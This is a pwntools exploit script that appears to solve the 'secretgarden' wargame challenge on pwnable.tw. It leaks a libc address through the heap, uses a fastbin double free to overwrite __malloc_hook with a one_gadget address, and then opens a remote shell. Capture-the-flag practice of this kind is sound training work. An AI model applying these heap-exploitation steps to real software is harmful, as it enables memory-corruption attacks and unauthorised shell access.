#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from sys import argv
import os
# from os import system
# context.log_level = 'debug'
# context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

elf = ELF('./secretgarden')
# libc = ELF('./')
one_gadget = 0xef6c4
main_arena = 0x3c3b20
malloc_hook = 0x3c3b10
if argv[1]=='l':
    # env = {"LD_LIBRARY_PATH":os.path.join(os.getcwd(), "./libc_64.so.6")}
    io = process('./secretgarden')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0xf02a4
    main_arena = 0x3c4b20
    malloc_hook = 0x3c4b10
    pid = proc.pidof(io)[0]
    success('pid -> {}'.format(pid))
    libc_base = io.libs()['/lib/x86_64-linux-gnu/libc.so.6']
    success('libc base -> {:#x}'.format(libc_base))
    # proc_base = io.libs()['']
    # success('proc_base -> {:#x}'.format(proc_base))
    raw_input('debug?')
else:
    io = remote('chall.pwnable.tw', 10203)


def raise_flower(Length,Name,Color):
    io.sendlineafter('Your choice : ',str(1))
    io.sendlineafter('Length of the name :',str(Length))
    io.sendafter('The name of flower :',Name)
    io.sendlineafter('The color of the flower :',Color)
    io.recvuntil('Successful !\n')

def visit_garden():
    io.sendlineafter('Your choice : ',str(2))

def remove_flower(Index):
    io.sendlineafter('Your choice : ',str(3))
    io.sendlineafter('remove from the garden:',str(Index))

def clean_garden():
    io.sendlineafter('Your choice : ',str(4))
    io.recvuntil('Done!\n')


if __name__ =='__main__':
    # leak libc
    log.info('to leak libc address')
    raise_flower(256, 'aaaa', '1111')
    raise_flower(256, 'bbbb', '2222')
    remove_flower(0)
    raise_flower(208,'aaalibc:', '2333')
    visit_garden()
    io.recvuntil('aaalibc:')
    libc_base = u64(io.recvuntil('\n',drop = True).ljust(8,'\x00')) - main_arena - 88
    success('libc_base -> {:#x}'.format(libc_base))

    # UAF
    raise_flower(0x60, 'cccc','first')
    raise_flower(0x60, 'dddd','second')
    remove_flower(3)
    remove_flower(4)
    remove_flower(3)
    raise_flower(0x60, p64(libc_base+malloc_hook-35), 'changeFD2mallochook')
    raise_flower(0x60, 'eeee', 'usetheforthchunk')
    raise_flower(0x60, 'ffff', 'useanotherchunk')
    payload = 'a'*19+p64(libc_base+one_gadget)
    success('one_gadget -> {:#x}'.format(libc_base+one_gadget))
    raw_input('change the malloc_hook to one gadget')
    raise_flower(0x60, payload, 'writeonegadtohook')
    
    #get shell
    # the register not fit when call malloc
    # raise_flower(0x80, 'getshell', 'bingo')
    remove_flower(5)
    remove_flower(5)
    io.interactive()
    io.close()
